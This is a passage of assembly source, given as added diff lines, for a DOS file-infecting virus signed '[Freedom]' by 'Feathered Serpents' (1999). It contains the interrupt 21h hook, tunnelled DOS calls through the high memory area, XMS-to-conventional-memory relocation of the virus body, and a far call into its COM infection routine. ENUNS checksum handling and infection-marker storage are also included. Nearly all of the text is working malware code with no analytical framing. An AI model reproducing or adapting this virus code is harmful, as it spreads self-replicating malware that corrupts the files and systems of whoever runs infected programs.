+i21_normal_resume endp
+i21_normal endp
+
+i21_execute proc near
+    push es
+    pusha
+
+    ; Allocate some standard memory
+    ;
+    ; INT 21 - DOS 2+ - ALLOCATE MEMORY
+    ;         AH = 48h
+    ;         BX = number of paragraphs to allocate
+    ; Return: CF clear if successful
+    ;             AX = segment of allocated block
+    ;         CF set on error
+    ;             AX = error code (07h,08h) (see #1366 at AH=59h/BX=0000h)
+    ;             BX = size of largest available block
+    ;
+    mov ah, 48h
+    mov bx, ((SIZE_ALL / 10h) + 1)
+    call tunnel_run
+    jc i21_execute_nomem
+
+    push ds
+    push cs
+    pop ds
+    mov ds:[bp+i21_handler_infectjmp+2], ax
+
+    ; Prepare XMS for move to conventional memory, being sure that the
+    ; XMS handle isn't destroyed/lost in the process (that's what the
+    ; PUSH/POPs of the source/destination handle are for, as the XMS
+    ; handle isn't saved anywhere else).
+    ;
+    ; Format of EMM structure:
+    ; Offset  Size    Description
+    ;  00h    DWORD   number of bytes to move (must be even)
+    ;  04h    WORD    source handle
+    ;  06h    DWORD   offset into source block
+    ;  0Ah    WORD    destination handle
+    ;  0Ch    DWORD   offset into destination block
+    ; Notes:  if either handle is zero, the corresponding offset is
+    ;         interpreted as a real-mode address referring to memory
+    ;         directly addressable by the processor
+    ;
+    push word ptr ds:[bp+xms_emm.desthandle]
+    pop word ptr ds:[bp+xms_emm.sourcehandle]
+    mov word ptr ds:[bp+xms_emm.sourceoffset], 0
+    mov word ptr ds:[bp+xms_emm.sourceoffset+2], 0
+    mov word ptr ds:[bp+xms_emm.desthandle], 0
+    mov word ptr ds:[bp+xms_emm.destoffset], 0
+    mov word ptr ds:[bp+xms_emm.destoffset+2], ax
+
+    ; Move, and exit if failure
+    ;
+    ; Call the XMS driver "Move extended memory block" function with:
+    ;         AH = 0Bh
+    ;         DS:SI -> EMM structure (see #2463)
+    ; Return: AX = status
+    ;             0001h success
+    ;             0000h failure
+    ;                 BL = error code (80h-82h,A3h-A9h) (see #2462)
+    ;
+    mov ah, 0bh
+    lea si, [bp+xms_emm]
+    call dword ptr ds:[bp+xms_control]
+    push word ptr ds:[bp+xms_emm.sourcehandle]
+    pop word ptr ds:[bp+xms_emm.desthandle]
+
+    pop ds
+    dec ax
+    jnz i21_execute_nomem
+
+    ; Call the infection routine in conventional memory.
+    db 09ah
+    i21_handler_infectjmp dw (offset infect - 100h)
+                          dw ?
+
+    ; INT 21 - DOS 2+ - FREE MEMORY
+    ;         AH = 49h
+    ;         ES = segment of block to free
+    ; Return: CF clear if successful
+    ;         CF set on error
+    ;             AX = error code (07h,09h) (see #1366 at AH=59h/BX=0000h)
+    ;
+    push es
+    mov ah, 49h
+    push cs:[bp+i21_handler_infectjmp+2]
+    pop es
+    call tunnel_run
+    pop es
+
+i21_execute_nomem proc near
+    popa
+    pop es
+
+    jmp i21_normal
+i21_execute_nomem endp
+i21_execute endp
+i21_handler endp
+
+memory_delta proc near
+    ; Standard method of finding delta offset.
+    call $+3
+    pop bp
+    sub bp, offset $-1
+    ret
+memory_delta endp
+
+tunnel_run proc near
+    ; Execute a well tunneled i21 by calling ourselves
+    pushf
+    db 09ah
+    hma_address         dw 0, -1
+    ret
+tunnel_run endp
+
+xms_control_get proc near
+    ; Find the address of the XMS handler, as it uses a hardcoded address
+    ; for function calls rather than interrupt functions.
+    ;
+    ; INT 2F - EXTENDED MEMORY SPECIFICATION (XMS) v2+ - GET DRIVER ADDRESS
+    ;         AX = 4310h
+    ; Return: ES:BX -> driver entry point
+    ;
+    mov ax, 4310h
+    int 2fh
+    mov cs:[bp+xms_control], bx
+    mov cs:[bp+xms_control+2], es
+    mov word ptr cs:[bp+xms_emm.blocksize], (SIZE_FIL)
+    mov word ptr cs:[bp+xms_emm.blocksize+2], 0
+    ret
+xms_control_get endp
+
+    
+    db 0
+    db '[Freedom], using Freedom Technology', 0ah, 0dh
+    db 'Both are (c)1999 Feathered Serpents', 0ah, 0dh
+    db 0
+
+    ; XMS handler requires virus size to be even for Extended Memory
+    ; Moves.  So we set this ODD, so that the ENUNS make it EVEN.
+    even
+    db 0
+
+    ; Last 7 bytes of COM files are copied here.  ENUNS COM files set the
+    ; first 5 of these bytes to 'ENUNS', with the following word a file
+    ; checksum that corrects itself when we add the virus size to it.
+    com_enuns           db 7 dup (?)
+
+        start_heap label
+
+    ; Format of EMM structure:
+    ; Offset  Size    Description
+    ;  00h    DWORD   number of bytes to move (must be even)
+    ;  04h    WORD    source handle
+    ;  06h    DWORD   offset into source block
+    ;  0Ah    WORD    destination handle
+    ;  0Ch    DWORD   offset into destination block
+    ; Notes:  if either handle is zero, the corresponding offset is
+    ;         interpreted as a real-mode address referring to memory
+    ;         directly addressable by the processor
+    ;
+    xms_emm_struc struc
+        blocksize       dd ?
+        sourcehandle    dw ?
+        sourceoffset    dd ?
+        desthandle      dw ?
+        destoffset      dd ?
+    xms_emm_struc ends
+
+    xms_emm             xms_emm_struc <>
+    xms_control         dw ?, ?
+    i21_csip            dw ?, ?
+
+        end_hma     label
+hma endp
+
+    ; Stores high DOS version, so infect routines can tell wether we are
+    ; running under Win9x, and as such should save extra file stamp info.
+    infect_version      db ?
+        end_heap  label
+        end_virus label
+virus ends
+end com
